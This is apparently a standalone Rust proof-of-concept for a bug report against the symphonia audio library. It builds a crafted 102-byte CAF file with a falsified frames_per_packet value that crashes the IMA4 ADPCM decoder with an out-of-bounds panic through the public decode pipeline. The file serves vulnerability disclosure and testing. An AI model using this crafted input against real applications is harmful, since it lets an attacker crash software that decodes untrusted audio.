//! Standalone, end-to-end reproduction for: index-out-of-bounds panic in
//! symphonia-codec-adpcm's IMA QT (Apple IMA4) decoder, triggered by a real, crafted 102-byte CAF
//! file, via symphonia's real public probe -> demux -> decode pipeline (the same pipeline any
//! application using this crate, e.g. symphonia-play, would use).
//!
//! The CAF 'desc' chunk's `frames_per_packet` field is fully attacker-controlled and, for the
//! `ima4` codec, is passed straight through by symphonia-format-caf's demuxer as both
//! `max_frames_per_packet` and `frames_per_block` (see
//! `symphonia-format-caf/src/demuxer.rs::read_audio_description_chunk`). The IMA QT decoder,
//! however, hardcodes an assumption of exactly 64 frames per block (a fixed 34-byte IMA4 packet)
//! regardless of what `frames_per_block` it was actually configured with, and writes into its
//! output buffer (whose real length is `frames_per_block`) without checking first.
//!
//! This crafted file declares `frames_per_packet = 2` (a value far below the codec's real 64),
//! which is enough to panic on the very first sample pair written.

use symphonia::core::formats::probe::Hint;
use symphonia::core::formats::{FormatOptions, TrackType};
use symphonia::core::io::MediaSourceStream;
use symphonia::core::meta::MetadataOptions;

fn chunk(ctype: &[u8; 4], payload: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(4 + 8 + payload.len());
    out.extend_from_slice(ctype);
    out.extend_from_slice(&(payload.len() as i64).to_be_bytes());
    out.extend_from_slice(payload);
    out
}

fn build_malicious_caf() -> Vec<u8> {
    let mut out = Vec::new();
    out.extend_from_slice(b"caff");
    out.extend_from_slice(&1u16.to_be_bytes()); // file version
    out.extend_from_slice(&0u16.to_be_bytes()); // file flags

    let mut desc = Vec::new();
    desc.extend_from_slice(&44100.0f64.to_be_bytes()); // sample_rate
    desc.extend_from_slice(b"ima4"); // format_id
    desc.extend_from_slice(&0u32.to_be_bytes()); // format_flags
    desc.extend_from_slice(&34u32.to_be_bytes()); // bytes_per_packet (real IMA4 packet size)
    desc.extend_from_slice(&2u32.to_be_bytes()); // frames_per_packet -- malicious: real ima4 blocks are 64
    desc.extend_from_slice(&1u32.to_be_bytes()); // channels_per_frame
    desc.extend_from_slice(&16u32.to_be_bytes()); // bits_per_channel
    assert_eq!(desc.len(), 32);
    out.extend_from_slice(&chunk(b"desc", &desc));

    let mut data_payload = Vec::new();
    data_payload.extend_from_slice(&0u32.to_be_bytes()); // edit_count
    data_payload.extend_from_slice(&[0u8; 34]); // one 34-byte IMA4 packet
    out.extend_from_slice(&chunk(b"data", &data_payload));

    out
}

fn main() {
    let data = build_malicious_caf();
    println!("crafted CAF file: {} bytes", data.len());

    let mss = MediaSourceStream::new(Box::new(std::io::Cursor::new(data)), Default::default());

    let mut format = symphonia::default::get_probe()
        .probe(&Hint::new(), mss, FormatOptions::default(), MetadataOptions::default())
        .expect("probe should recognize the crafted CAF file");

    let track = format.default_track(TrackType::Audio).expect("should have an audio track");
    let codec_params = track.codec_params.as_ref().unwrap().audio().unwrap();

    let mut decoder = symphonia::default::get_codecs()
        .make_audio_decoder(codec_params, &Default::default())
        .expect("should find a registered ADPCM IMA QT decoder");

    loop {
        let packet = match format.next_packet() {
            Ok(Some(p)) => p,
            Ok(None) => break,
            Err(e) => {
                println!("demux error (no crash): {e}");
                break;
            }
        };
        match decoder.decode(&packet) {
            Ok(_) => println!("decoded a packet OK"),
            Err(e) => println!("decode error (no crash): {e}"),
        }
    }
    println!("finished (no crash)");
}
